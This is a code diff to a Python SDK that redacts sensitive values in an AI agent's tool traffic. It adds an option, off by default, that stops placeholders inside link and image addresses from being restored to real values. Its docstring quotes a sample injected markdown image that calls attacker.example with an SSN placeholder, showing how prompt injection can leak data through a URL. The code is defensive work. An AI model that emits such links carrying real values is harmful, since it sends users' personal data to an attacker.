@@ -119,6 +119,7 @@ class Ward:
         placeholder_ttl: float | None = None,
         placeholder_instruction: bool = True,
         placeholder_strict: bool = False,
+        placeholder_restore_in_urls: bool | None = None,
     ) -> None:
         self.default = ToolPolicy(default_destination, default_jurisdiction)
         self.policies: dict[str, ToolPolicy] = {
@@ -134,6 +135,9 @@ class Ward:
         # Raise PlaceholderRestoreError when a model answer has placeholders
         # that could not be restored (default: warn and record on the span).
         self.placeholder_strict = placeholder_strict
+        # Restore placeholders inside link and image addresses too (gap G1).
+        # None: TAINTWARD_RESTORE_IN_URLS, default off.
+        self.placeholder_restore_in_urls = placeholder_restore_in_urls
 
     def policy_for(self, tool_name: str) -> ToolPolicy:
         return self.policies.get(tool_name, self.default)
@@ -152,7 +156,8 @@ class Ward:
                  placeholder_vault=self.placeholder_vault,
                  placeholder_ttl=self.placeholder_ttl,
                  placeholder_instruction=self.placeholder_instruction,
-                 placeholder_strict=self.placeholder_strict)
+                 placeholder_strict=self.placeholder_strict,
+                 placeholder_restore_in_urls=self.placeholder_restore_in_urls)
         w.policies = {**self.policies, **{k: _to_policy(v) for k, v in mapping.items()}}
         return w
 
@@ -174,9 +179,10 @@ class Ward:
             if conversation_id and self.placeholder_vault is not None:
                 pmap = ph.PlaceholderMap(vault=self.placeholder_vault,
                                          conversation_id=conversation_id,
-                                         ttl=self.placeholder_ttl)
+                                         ttl=self.placeholder_ttl,
+                                         restore_in_urls=self.placeholder_restore_in_urls)
             else:
-                pmap = ph.PlaceholderMap()
+                pmap = self.new_placeholder_map()
             tok = ph.activate(pmap)
         try:
             yield root
@@ -196,12 +202,22 @@ class Ward:
         if not self.placeholders:
             return None
         pmap = ph.current()
-        return pmap if pmap is not None else ph.PlaceholderMap()
+        return pmap if pmap is not None else self.new_placeholder_map()
+
+    def new_placeholder_map(self) -> "ph.PlaceholderMap":
+        return ph.PlaceholderMap(restore_in_urls=self.placeholder_restore_in_urls)
 
     def restore(self, value: Any) -> Any:
         """Swap placeholders back to real values with the current run's map
-        (for output the adapters do not restore, e.g. collected stream text)."""
-        return ph.restore(value) if self.placeholders else value
+        (for output the adapters do not restore, e.g. collected stream text).
+        Each call is recorded with ``redact.record_reversal`` (gap G11)."""
+        if not self.placeholders:
+            return value
+        out = ph.restore(value)
+        found = (len(ph.placeholders_in(value)) or 1) if out != value else 0
+        from taintward.sdk.redact import record_reversal
+        record_reversal("placeholder", found=found)
+        return out
 
     # Adapter shortcuts (imported lazily so the frameworks stay optional).
     def wrap_langchain_tools(self, tools, mapping=None):
@@ -283,6 +299,7 @@ def init(
     placeholder_ttl: float | None = None,
     placeholder_instruction: bool = True,
     placeholder_strict: bool = False,
+    placeholder_restore_in_urls: bool | None = None,
 ) -> Ward:
     """Configure Taintward once per process and return the global ``Ward``.
 
@@ -308,6 +325,11 @@ def init(
     * ``placeholder_strict`` (default False): raise
       ``placeholders.PlaceholderRestoreError`` when the model's answer has
       placeholders that could not be restored, instead of a warning.
+    * ``placeholder_restore_in_urls`` (default off, or
+      ``TAINTWARD_RESTORE_IN_URLS=1``): also restore placeholders inside link
+      and image addresses. Off, an injected
+      ``![x](https://attacker.example/?d=<SSN_1>)`` keeps the placeholder
+      instead of carrying the real value out (gap G1).
     """
     global _GLOBAL
     if tracer is None:
@@ -325,6 +347,7 @@ def init(
         placeholder_ttl=placeholder_ttl,
         placeholder_instruction=placeholder_instruction,
         placeholder_strict=placeholder_strict,
+        placeholder_restore_in_urls=placeholder_restore_in_urls,
     )
     return _GLOBAL
 
